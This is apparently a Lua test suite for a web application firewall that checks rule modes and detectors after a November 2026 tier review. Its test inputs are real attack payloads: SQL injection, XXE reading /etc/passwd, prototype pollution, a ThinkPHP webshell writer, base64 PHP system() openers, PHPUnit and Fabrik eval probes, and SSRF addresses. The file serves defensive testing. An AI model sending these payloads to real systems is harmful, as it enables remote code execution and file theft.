-- The 2026-11-17 tier review (7 days of cfm.waf.log and edge access.log on the
-- 8 edge nodes):
--   * shipped modes: 332 / 416 logonly→block, 303 / 307 / 438
--     challenge_v2→block, 10029 (Fabrik list-filter eval) new and logonly;
--   * 303, 307 and 416 have their bans held (WAFRule.HoldAutoblock), and a
--     held block rule shadows armed ones (CLAUDE.md §6), so they run late: an
--     armed block hit on the same request keeps the headline (the one
--     cfm.lua pushes to waf_security);
--   * rule 10029 (CVE-2026-67282) on the exploit the dmkomotinis.gr attacker
--     sent, and not on Fabrik's own list filter;
--   * rule 701's SSRF_DWORD_IP only for a value an IPv4 address can be;
--   * rule 601 off the Optimization Detective url-metrics beacon.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}
package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")
local det = require("cfm_waf_detectors")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

-- ── Shipped modes ─────────────────────────────────────────────────────────────
local SHIPPED = waf.get_config()
do
  local want = {
    rule_php_code_args = "block", rule_php_file_body = "block", rule_js_proto = "block",
    rule_xxe = "block", rule_php_encoded_opener_b64 = "block",
    rule_cve_fabrik_listfilter_eval = "logonly", rule_cve_translatepress_id_lookup = "block",
    rule_ssrf = "challenge_v2", rule_ctrl_chars = "challenge_v2",
  }
  for k, m in pairs(want) do
    check(SHIPPED[k] == m, k .. " ships " .. m .. " (got " .. tostring(SHIPPED[k]) .. ")")
  end
end

local function restore()
  for k, m in pairs(SHIPPED) do
    if k:sub(1, 5) == "rule_" and type(m) == "string" then waf.set_rule(k, m) end
  end
end

local UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
local function run(o)
  local hit, reason, _, action, hits, rule_id = waf.check({
    uri = o.uri or "/", args = o.args or "", method = o.method or "GET",
    raw_uri = (o.uri or "/") .. ((o.args and o.args ~= "") and ("?" .. o.args) or ""),
    host = "www.example.gr", ip = "198.51.100.9", body = o.body or "", cookie = "",
    headers = { host = "www.example.gr", ["user-agent"] = UA, accept = "*/*",
                ["content-type"] = o.ct },
  })
  local ids = {}
  for _, h in ipairs(hits or {}) do ids[tostring(h.waf_rule_id)] = h.action end
  return { hit = hit, reason = tostring(reason), action = action, rule_id = rule_id, ids = ids }
end
local function show(r) return r.reason .. "/" .. tostring(r.action) .. " id=" .. tostring(r.rule_id) end

-- ── Held block rules run late: the armed rule keeps the headline ─────────────
-- Shipped modes throughout. Rule 301 (WAF_SQLI, armed) on the query, a held
-- rule's marker in the body: before 2026-11-17 303 (step 14) ran before 301
-- (step 21) and would now take the headline as a block and drop the ban.
restore()
do
  local SQLI = "id=1%20union%20select%201,2,3--"
  local alone = run{ args = SQLI }
  check(alone.hit and alone.action == "block" and alone.rule_id == 301,
        "premise: the query alone is a 301 block (" .. show(alone) .. ")")

  local r = run{ method = "POST", args = SQLI, ct = "application/json",
                 body = '{"__proto__":{"then":"$1:__proto__:then"}}' }
  check(r.rule_id == 301 and r.action == "block", "303 + 301: the armed 301 keeps the headline (" .. show(r) .. ")")

  r = run{ method = "POST", args = SQLI, ct = "application/xml",
           body = '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>' }
  check(r.rule_id == 301 and r.action == "block", "307 + 301: the armed 301 keeps the headline (" .. show(r) .. ")")

  r = run{ method = "POST", uri = "/up.php", args = SQLI, ct = "application/octet-stream",
           body = "<?php echo 1;" }
  check(r.rule_id == 301 and r.action == "block", "416 + 301: the armed 301 keeps the headline (" .. show(r) .. ")")
end

-- 416 vs the armed CVE rules that run between its old (60e) and new place:
-- a `<?php`-prefixed lost-password POST carrying TranslatePress's
-- trp-edit-translation is 10018's (armed), not 416's (held).
do
  local r = run{ method = "POST", uri = "/wp-login.php", args = "action=lostpassword",
                 ct = "application/x-www-form-urlencoded",
                 body = "<?php=1&user_login=admin&trp-edit-translation=preview&redirect_to=" }
  check(r.ids["10018"] == "block", "premise: 10018 fires (" .. show(r) .. ")")
  check(r.rule_id == 10018, "416 + 10018: the armed 10018 keeps the headline (" .. show(r) .. ")")
end

-- Each held rule alone still blocks.
do
  local r = run{ method = "POST", ct = "text/plain;charset=UTF-8",
                 body = '{"then":"$1:__proto__:then","status":"resolved_model"}' }
  check(r.rule_id == 303 and r.action == "block", "303 alone blocks (" .. show(r) .. ")")
  r = run{ method = "POST", ct = "application/xml",
           body = '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>' }
  check(r.rule_id == 307 and r.action == "block", "307 alone blocks (" .. show(r) .. ")")
  r = run{ method = "POST", ct = "application/xml",
           body = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p PUBLIC "x" "http://203.0.113.5/e.dtd">%p;]><r/>' }
  check(r.rule_id == 307 and r.action == "block", "307: a PUBLIC parameter entity blocks (" .. show(r) .. ")")
  -- An Illustrator SVG: DOCTYPE PUBLIC, internal entities only. Not a block.
  r = run{ method = "POST", uri = "/wp-json/wp/v2/media", ct = "image/svg+xml",
           body = '<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [<!ENTITY ns_extend "http://ns.adobe.com/Extensibility/1.0/">]><svg systemLanguage="en"/>' }
  check(r.ids["307"] == "challenge_v2", "307 on an Illustrator SVG stays challenge_v2 (" .. tostring(r.ids["307"]) .. ")")
  -- 303's constructor + .prototype leg stays challenge_v2.
  r = run{ method = "POST", uri = "/wp-json/custom/v1/save", ct = "application/json",
           body = '{"js":"function F(){}; F.prototype.x = 1; var c = o.constructor;"}' }
  check(r.ids["303"] == "challenge_v2", "303 JS_PROTO_CONSTRUCTOR stays challenge_v2 (" .. tostring(r.ids["303"]) .. ")")
  -- 416: a cPanel Web Disk PUT of a .php file is the customer's own upload.
  do
    local hit, _, _, _, hits = waf.check({ uri = "/public_html/index.php", args = "", method = "PUT",
      raw_uri = "/public_html/index.php", host = "webdisk.example.gr", ip = "198.51.100.9",
      body = "<?php echo 1;", cookie = "",
      headers = { host = "webdisk.example.gr", ["user-agent"] = "Microsoft-WebDAV-MiniRedir/10.0.19045",
                  ["content-type"] = "application/octet-stream" } })
    local saw416 = false
    for _, h in ipairs(hits or {}) do if h.waf_rule_id == 416 then saw416 = true end end
    check(not saw416, "416 skips a Web Disk PUT")
    hit, _, _, _, hits = waf.check({ uri = "/public_html/index.php", args = "", method = "POST",
      raw_uri = "/public_html/index.php", host = "webdisk.example.gr", ip = "198.51.100.9",
      body = "<?php echo 1;", cookie = "",
      headers = { host = "webdisk.example.gr", ["content-type"] = "application/octet-stream" } })
    saw416 = false
    for _, h in ipairs(hits or {}) do if h.waf_rule_id == 416 then saw416 = true end end
    check(saw416, "416 still reads a POST on a Web Disk host")
  end
  r = run{ method = "POST", uri = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
           ct = "application/x-www-form-urlencoded", body = "<?php echo(md5(\"Hello PHPUnit\"));" }
  check(r.rule_id == 416 and r.action == "block", "416 alone blocks: the PHPUnit sweep (" .. show(r) .. ")")
end

-- 332 and 438 are armed: they block where they are.
do
  local r = run{ args = "s=%3C%3F%3D%2F**%2Ffile_put_contents(%22runtime%2Farchive%2Fxz.php%22%2Cbase64_decode(%22R2lm%22))%3F%3E" }
  check(r.rule_id == 332 and r.action == "block", "332 blocks the ThinkPHP payload (" .. show(r) .. ")")
  r = run{ method = "POST", uri = "/wp-json/bricks/v1/render_element", ct = "application/json",
           body = '{"postId":"1","nonce":"x","element":{"name":"code","settings":{"code":"PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg=="}}}' }
  check(r.rule_id == 438 and r.action == "block", "438 blocks a Bricks render_element base64 opener (" .. show(r) .. ")")
  r = run{ method = "POST", uri = "/wp-admin/admin-ajax.php", ct = "application/x-www-form-urlencoded",
           body = "action=wpcode_save&code=PD9waHAgZWNobyAxOyA/Pg==" }
  check(not (r.ids["438"] == "block"), "438 on pre-auth admin-ajax stays logonly (got " .. tostring(r.ids["438"]) .. ")")
end

-- ── Rule 10029: Fabrik list-filter eval (CVE-2026-67282) ─────────────────────
do
  local base = "option=com_fabrik&view=list&listid=1"
  local function fab(extra, o)
    o = o or {}
    return run{ uri = o.uri or "/index.php", args = o.args or (base .. extra), method = o.method,
                ct = o.ct, body = o.body }
  end
  local A = "WAF_CVE:CVE_2026_67282:FABRIK:"
  -- The attacker's probe, exactly as earth logged it.
  local r = fab("&dm_ypodeigma1a___aiton%5Bvalue%5D=1%3B&dm_ypodeigma1a___aiton%5Beval%5D=1&dm_ypodeigma1a___aiton%5Bcondition%5D=%3D")
  check(r.ids["10029"] == "logonly", "the probe: 10029 logonly (" .. show(r) .. ")")
  check(det.detect_cve_fabrik_listfilter_eval("/index.php", "get",
          base .. "&x___y%5Beval%5D=1", "", {}, nil) == "EVAL_ARG", "detector: EVAL_ARG")
  -- Unencoded brackets, and a SEF route with no option field.
  check(det.detect_cve_fabrik_listfilter_eval("/index.php/component/fabrik/list/1", "get",
          "t___e[eval]=1", "", {}, nil) == "EVAL_ARG", "SEF route, raw brackets")
  -- A menu-alias route: neither option nor fabrik in the path, the element's ___ is.
  check(det.detect_cve_fabrik_listfilter_eval("/my-list", "get",
          "dm_t___el[eval]=1", "", {}, nil) == "EVAL_ARG", "menu-alias route, ___ element")
  -- A urlencoded POST (Fabrik reads $_REQUEST) and a multipart one.
  check(det.detect_cve_fabrik_listfilter_eval("/index.php", "post", "",
          base .. "&t___e%5Beval%5D=1&t___e%5Bvalue%5D=x",
          { ["content-type"] = "application/x-www-form-urlencoded" }, nil) == "EVAL_BODY", "urlencoded POST")
  check(det.detect_cve_fabrik_listfilter_eval("/index.php", "post", base,
          "--b\r\nContent-Disposition: form-data; name=\"t___e[eval]\"\r\n\r\n1\r\n--b--\r\n",
          { ["content-type"] = "multipart/form-data; boundary=b" }, nil) == "EVAL_BODY", "multipart POST")
  -- `[eval]=0`: logonly whatever the rule's mode.
  check(det.detect_cve_fabrik_listfilter_eval("/index.php", "get",
          base .. "&t___e%5Beval%5D=0", "", {}, nil) == "EVAL_ZERO", "detector: EVAL_ZERO")
  waf.set_rule("rule_cve_fabrik_listfilter_eval", "block")
  r = fab("&t___e%5Beval%5D=0")
  check(r.ids["10029"] == "logonly", "[eval]=0 stays logonly under block (" .. tostring(r.ids["10029"]) .. ")")
  r = fab("&t___e%5Beval%5D=1")
  check(r.rule_id == 10029 and r.action == "block" and r.reason == A .. "EVAL_ARG", "[eval]=1 under block (" .. show(r) .. ")")
  restore()
  -- Fabrik's own list filter: no [eval].
  r = fab("&resetfilters=0&dm_ypodeigma1a___aiton%5Bvalue%5D=%CE%9A%CE%BF%CE%BC%CE%BF%CF%84%CE%B7%CE%BD%CE%AE&dm_ypodeigma1a___aiton%5Bcondition%5D=CONTAINS&limitstart1=20")
  check(r.ids["10029"] == nil, "Fabrik's own filter: clean")
  -- [eval] outside Fabrik, and look-alike keys.
  check(det.detect_cve_fabrik_listfilter_eval("/search", "get", "q[eval]=1", "", {}, nil) == nil,
        "[eval] on a non-Fabrik route")
  check(det.detect_cve_fabrik_listfilter_eval("/index.php", "get",
          base .. "&t___e%5Bevaluation%5D=1&eval=1", "", {}, nil) == nil, "[evaluation] / bare eval")
  check(det.detect_cve_fabrik_listfilter_eval("/index.php", "get",
          base .. "&t___e%5Beval%5D=", "", {}, nil) == nil, "an empty [eval]")
  -- Only the exact "0" is falsy in PHP.
  check(det.detect_cve_fabrik_listfilter_eval("/index.php", "get",
          base .. "&t___e%5Beval%5D=%200", "", {}, nil) == "EVAL_ARG", "[eval]=' 0' is set (PHP-truthy)")
  -- The cheap gate: with _nab (what cfm_waf.check passes) a request naming
  -- neither eval nor Fabrik is not parsed, multipart included; one that does is.
  local mp = "--b\r\nContent-Disposition: form-data; name=\"t___e[eval]\"\r\n\r\n1\r\n--b--\r\n"
  local mph = { ["content-type"] = "multipart/form-data; boundary=b" }
  check(det.detect_cve_fabrik_listfilter_eval("/upload", "post", "", "--b\r\nContent-Disposition: form-data; name=\"f\"\r\n\r\nx\r\n--b--\r\n",
          mph, "&--b content-disposition: form-data; name=\"f\" x --b--") == nil, "multipart without eval: gated out")
  check(det.detect_cve_fabrik_listfilter_eval("/index.php", "post", base, mp, mph,
          base .. "&" .. mp:lower()) == "EVAL_BODY", "multipart with eval and Fabrik: read")
end

-- ── Rule 701: SSRF_DWORD_IP only for an IPv4-sized value ─────────────────────
do
  check(det.detect_ssrf_proto("u=http://2130706433/", "") == "SSRF_DWORD_IP", "://2130706433 (127.0.0.1)")
  check(det.detect_ssrf_proto("u=http://4294967295/", "") == "SSRF_DWORD_IP", "://4294967295 (the top)")
  check(det.detect_ssrf_proto("search=https://4932498770&per_page=20", "") == nil,
        "://4932498770 is no address (toolpoint.gr's search, 2026-11-16)")
  check(det.detect_ssrf_proto("a=https://4932498770&b=http://3232235777/", "") == "SSRF_DWORD_IP",
        "a later valid DWORD still fires")
  check(det.detect_ssrf_proto("u=http://21307064330/", "") == nil, "11 digits")
end

-- ── Rule 601: not on the Optimization Detective beacon ───────────────────────
do
  local ctl = '{"url":"https://enateam.gr/en/","elements":[{"xpath":"\1"}]}'
  local h = { ["content-type"] = "application/json" }
  check(det.detect_ctrl_chars("", ctl, h, "/wp-json/wp/v2/posts") == true, "premise: control bytes in JSON")
  check(det.detect_ctrl_chars("slug=b9ca&current_etag=1962", ctl, h,
          "/en/wp-json/optimization-detective/v1/url-metrics:store") == false, "OD beacon, /en/ prefix")
  check(det.detect_ctrl_chars("rest_route=%2Foptimization-detective%2Fv1%2Furl-metrics%3Astore", ctl, h,
          "/index.php") == false, "OD beacon, ?rest_route= (encoded)")
  check(det.detect_ctrl_chars("rest_route=/optimization-detective/v1/url-metrics:store", ctl, h,
          "/") == false, "OD beacon, ?rest_route= (raw)")
  check(det.detect_ctrl_chars("", ctl, h, "/wp-json/optimization-detective/v1/other") == true,
        "another OD route still checked")
  -- Anchored: the string elsewhere skips nothing.
  check(det.detect_ctrl_chars("", ctl, h, "/x.php/wp-json/optimization-detective/v1/url-metrics:store") == true,
        "PATH_INFO behind a script is still checked")
  check(det.detect_ctrl_chars("", ctl, h, "/a/b/wp-json/optimization-detective/v1/url-metrics:store") == true,
        "two segments in front are still checked")
  check(det.detect_ctrl_chars("x=1&rest_route=/optimization-detective/v1/url-metrics:store", ctl, h,
          "/wp-login.php") == true, "rest_route on /wp-login.php is still checked")
  check(det.detect_ctrl_chars("rest_route=/optimization-detective/v1/url-metrics:store/../../x", ctl, h,
          "/") == true, "a rest_route that only starts with the route is still checked")
  check(det.detect_ctrl_chars("q=rest_route=/optimization-detective/v1/url-metrics:store", ctl, h,
          "/") == true, "the string inside another field's value is still checked")
  check(det.detect_ctrl_chars("rest_route=/optimization-detective/v1/url-metrics:store", ctl, h,
          "/login") == true, "rest_route on another app's /login is still checked")
  check(det.detect_ctrl_chars("rest_route=/optimization-detective/v1/url-metrics:store", ctl, h,
          "/en/") == false, "rest_route under a language prefix")
end

if fails > 0 then
  io.stderr:write(("cfm_waf tier review 2026-11-17 tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: tier review 2026-11-17 (332/416/303/307/438 block, held ones late, 10029, 701 DWORD, 601 OD beacon)")
